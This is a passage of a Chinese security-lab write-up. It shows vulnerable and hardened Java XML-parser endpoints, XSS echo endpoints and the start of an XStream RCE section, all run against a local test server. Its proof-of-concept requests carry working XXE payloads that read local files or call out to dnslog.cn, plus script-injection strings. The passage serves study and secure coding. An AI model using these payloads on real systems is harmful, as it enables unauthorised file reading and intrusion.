<span class="hljs-title function_">SAXBuilderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXBuilder</span>();<br>        <span class="hljs-comment">//禁止 DOCTYPE 声明。</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//禁止解析 外部通用实体 &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">//禁止解析 外部参数实体</span><br>        builder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.jdom2.Document document</span><br>        builder.build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXBuilder xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-SAXReader-vuln"><a href="#5-SAXReader-vuln" class="headerlink" title="5.&#x2F;SAXReader&#x2F;vuln"></a>5.&#x2F;SAXReader&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body))); <span class="hljs-comment">// cause xxe</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe vuln code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXReader/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://f89q97.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080944246.png" alt="20250727123019413"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945207.png" alt="20250727123025939"></p><h3 id="6-SAXReader-sec"><a href="#6-SAXReader-sec" class="headerlink" title="6.&#x2F;SAXReader&#x2F;sec"></a>6.&#x2F;SAXReader&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXReader/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXReaderSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SAXReader</span>();<br>        reader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        reader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// org.dom4j.Document document</span><br>        reader.read(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)));<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXReader xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="7-SAXParser-vuln"><a href="#7-SAXParser-vuln" class="headerlink" title="7.&#x2F;SAXParser&#x2F;vuln"></a>7.&#x2F;SAXParser&#x2F;vuln</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/vuln&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserVuln</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe vuln code&quot;</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe/SAXParser/vuln</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_1040d081eea13b44d84a4af639640d51=1750255737; JSESSIONID=D2EF253CA324816B83856F97FD262FA9; XSRF-TOKEN=77424855-a7a9-48d1-a3f6-a41419feacf0<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>152<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span></span><br><span class="hljs-meta"><span class="language-xml">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://h1bdeh.dnslog.cn&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080945564.png" alt="20250727123517394"></p><h3 id="8-SAXParser-sec"><a href="#8-SAXParser-sec" class="headerlink" title="8.&#x2F;SAXParser&#x2F;sec"></a>8.&#x2F;SAXParser&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/SAXParser/sec&quot;, method = RequestMethod.POST)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">SAXParserSec</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>        logger.info(body);<br><br>        <span class="hljs-type">SAXParserFactory</span> <span class="hljs-variable">spf</span> <span class="hljs-operator">=</span> SAXParserFactory.newInstance();<br>        spf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">SAXParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> spf.newSAXParser();<br>        parser.parse(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputSource</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringReader</span>(body)), <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultHandler</span>());  <span class="hljs-comment">// parse xml</span><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(e.toString());<br>        <span class="hljs-keyword">return</span> EXCEPT;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;SAXParser xxe security code&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="9-这些方法的利用和修复都是一样的。"><a href="#9-这些方法的利用和修复都是一样的。" class="headerlink" title="9.这些方法的利用和修复都是一样的。"></a>9.这些方法的利用和修复都是一样的。</h3><p>POC构造：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs xml">POST /xxe/***/*** HTTP/1.1<br>Host: 127.0.0.1:8081<br>Content-Type: application/xml<br>Content-Length: 198  可以不写<br>Connection: close<br>        此处空一行 分隔 Header 与 Body <br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [  </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span>  </span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br>或<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://1izyf3.dnslog.cn&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span><br></code></pre></td></tr></table></figure><p>修复：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">xmlReader.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-literal">true</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-literal">false</span>);<br>xmlReader.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-literal">false</span>);<br></code></pre></td></tr></table></figure><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/reflect&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reflect</span><span class="hljs-params">(String xss)</span> &#123;<br>    <span class="hljs-keyword">return</span> xss;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">http://127.0.0.1:8081/xss/reflect?xss=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946271.png" alt="20250727110941871"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//先将 xss 储存在 cookie 中，</span><br><span class="hljs-meta">@RequestMapping(&quot;/stored/store&quot;)</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">store</span><span class="hljs-params">(String xss, HttpServletResponse response)</span> &#123;<br>    <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;xss&quot;</span>, xss);<br>    response.addCookie(cookie);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Set param into cookie&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//访问 /stored/show 看到xss</span><br> <span class="hljs-meta">@RequestMapping(&quot;/stored/show&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue(&quot;xss&quot;)</span> String xss)</span> &#123;<br>        <span class="hljs-keyword">return</span> xss;<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored<span class="hljs-regexp">/store?xss=&lt;script&gt;alert(1)&lt;/</span>script&gt;<br><br>http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/xss/</span>stored/show<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080946560.png" alt="20250727111445251"></p><p><img src="https://gitee.com/xvshifu/pic-go/raw/master/img/20250727111506996.png" alt="image-20250727111506881"></p><h2 id="XStreamRce"><a href="#XStreamRce" class="headerlink" title="XStreamRce"></a>XStreamRce</h2><blockquote><p>XStream是Java类库，用来将对象序列化成XML （JSON）或反序列化为对象。</p><p><strong>也就是说，使用XStream，我们可以把Java对象转换成XML，也可以将XML转换为Java对象。</strong></p><p>有RCE漏洞受影响版本：<br>Xstream affected version: 1.4.10 or &lt;&#x3D; 1.4.6</p><p>CVE-2020-26217 | XStream远程代码执行漏洞 </p><p><a href="https://www.cnblogs.com/303donatello/p/13998245.html">https://www.cnblogs.com/303donatello/p/13998245.html</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080947532.png" alt="20250727124508575"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@PostMapping(&quot;/xstream&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">parseXml</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> WebUtils.getRequestBody(request);<br>    <span class="hljs-type">XStream</span> <span class="hljs-variable">xstream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">XStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DomDriver</span>());<br>    xstream.addPermission(AnyTypePermission.ANY); <span class="hljs-comment">// This will cause all XStream versions to be affected.</span><br>    xstream.fromXML(xml);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;xstream&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>POC:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xstream</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8081<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;113&quot;, &quot;Not-A.Brand&quot;;v=&quot;24&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span 